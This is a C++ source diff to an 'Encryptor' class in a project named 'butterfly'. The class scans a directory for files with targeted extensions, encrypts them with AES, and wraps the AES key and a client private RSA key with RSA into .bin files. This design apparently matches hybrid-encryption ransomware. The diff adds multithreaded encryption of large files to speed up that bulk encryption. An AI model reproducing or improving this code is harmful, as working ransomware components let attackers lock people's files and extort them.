@@ -46,8 +46,12 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
     // Get all files from provided directory path
     auto files =  DirectoryIterator::getAllFiles(dirPath);
 
-    // Generate and validate the AES Key and IV
-    validateAESKeyLength();
+    if ( !aes::AESEncryptor::initDone() )
+    {
+        // Generate and validate the AES Key and IV
+        validateAESKeyLength();
+    }
+
     // Get the AESKeyPair(AESKey + AESIV)
     std::string aeskeypair = _aesEncryptor->getAESKeyPair();
 
@@ -64,10 +68,23 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
         // Check if the provided file extension is part of the fileExtensionVector
         if ( std::find(butterfly::fileExtensionVec.begin(), butterfly::fileExtensionVec.end(), DirectoryIterator::getFileExtension(file)) != butterfly::fileExtensionVec.end() )
         {
-            encryptFileWithAES(file.string());
+
+            // Compare file size with the MAX FILE SIZE
+            if ( butterfly::getFileSize(file.string(), true) > butterfly::MAX_FILE_SIZE)
+            {
+                LOG_TRACE("Spawn a new encryption thread for file: " << file.string());
+                spawnThread(file.string());
+            } else
+            {
+                encryptFileWithAES(file.string());
+            }
+
         }
 
     }
+
+    // Join all threads which were spawned for huge file encryption
+    joinThreads();
 
     // Save the final AESKey.bin file
     encryptFinalAESKeyWithRSA(aeskeypair, butterfly::ENC_AESKEY_FILENAME);
@@ -89,6 +106,7 @@ void Encryptor::encryptCPrivateRSA()
         std::string cPrivateRSAEnc = _rsaEncryptorCPrivateRSA->getEncryptedMessage();
         // Save the encrypted CPrivateRSA string to CPrivateRSA.bin
         _rsaEncryptorCPrivateRSA->writeEncMSGToFile(butterfly::ENC_CPRIVATERSA_FILENAME, cPrivateRSAEnc, encMSGLen);
+
     } catch (RSAEncryptionException &e)
     {
         std::cerr << e.what() << std::endl;
@@ -126,12 +144,32 @@ void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyStr, const st
         std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedMessage();
         // Save the encrypted AES Key to AESKey.bin
         _rsaEncryptorAESKey->writeEncMSGToFile(filename, aesKeyEnc, encMSGLen);
+
     } catch (RSAEncryptionException &e)
     {
         std::cerr << e.what() << std::endl;
         LOG_ERROR(e.what());
     }
 
+}
+
+void Encryptor::spawnThread(const std::string &filepath)
+{
+    // Create new instance for each huge file
+    std::unique_ptr<aes::AESEncryptor> aesEncInstance = std::unique_ptr<aes::AESEncryptor>(new aes::AESEncryptor());
+    // Create dedicated thread for this encryption file
+    std::thread t(&aes::AESEncryptor::encryptFile, *aesEncInstance, filepath);
+    // Save thread in thread vector
+    _threads.push_back(std::move(t));
+}
+
+void Encryptor::joinThreads()
+{
+    for (auto &t: _threads)
+    {
+        if (t.joinable())
+            t.join();
+    }
 }
 
 } // namespace hybrid
